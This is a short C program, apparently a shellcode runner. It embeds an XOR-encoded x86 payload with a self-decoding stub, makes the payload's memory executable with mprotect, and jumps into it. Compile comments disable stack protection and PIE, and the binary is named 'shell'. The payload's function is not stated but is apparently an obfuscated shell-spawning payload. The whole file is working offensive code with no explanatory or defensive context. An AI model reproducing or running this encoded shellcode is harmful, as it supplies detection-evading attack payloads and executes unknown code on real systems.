#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// gcc /tmp/test.c -o shell -m32 -fno-stack-protector -z execstack -no-pie
// gcc /tmp/test.c -o shell -m32

unsigned char code[] = "\xeb\x11\x5f\x31\xc9\xb1\xeb\x80\x74\x0f\xff\x36\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xdd\x27\x69\x07\xff\x87\xe5\xb6\x5a\x39\xc9\x54\xb6\xdf\x37\x43\xc0\xdd\x33\xde\xdc\xc9\xc9\xc9\x7b\xb4\xf6\xa5\x14\xa5\x0b\xa5\x1d\x25\x38\xda\x90\x46\x57\xda\x88\x46\x56\xdc\x88\x46\x57\xdc\x90\x46\x56\xd4\x7d\x52\xe1\x7b\x7b\x51\x7c\x0b\x57\x57\x57\x45\x7b\xa5\xf7\x25\x1d\xd4\xc3\x47\xf8\x63\x57\x7d\xd4\xe1\x55\x7b\x6e\x7c\x51\x57\x7a\x57\x57\x50\x76\xb0\x82\x30\x28\xe3\xe6\x52\xf7\xf1\x62\x08\xe3\xfc\x60\x76\x7d\x0b\x6c\x62\x09\x62\x62\xd1\x84\xce\x13\xce\xb1\xce\x94\x4e\xa6\x67\x2d\xe3\x3d\x67\xf0\xe3\x15\x79\xf3\xe3\x15\x79\xf0\xe3\x3d\x71\xf3\xff\x86\x84\x0a\xfa\x84\x94\x99\xf0\xf0\x9a\xf0\xb1\x66\xa6\xce\xaf\xce\x21\xce\xcc\x21\xe2\x19\x1b\xaf\xee\x32\x1b\x19\xff\x15\x94\x07\x49\xce\xfe\x1b\xff\x18\xfe\x4c\x71\x4e\xbc\xa2\x49\x66\xfe\x1b\x9e\x07\x87\x66\x9f\x66\x71\xc6\xa6\xa2\xfc\xce\xb1\x4e\x30\xce\xa2\x41\x3e\x26\x8b\x71\xb1\x9f\xaf\xce\x19\xce\xc0\x21\x19\xc0\xc0\x0c\x06\x19\x66\x1f\x41\x03\xa2\x9c\x61\xe4\xc4\x71";

int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}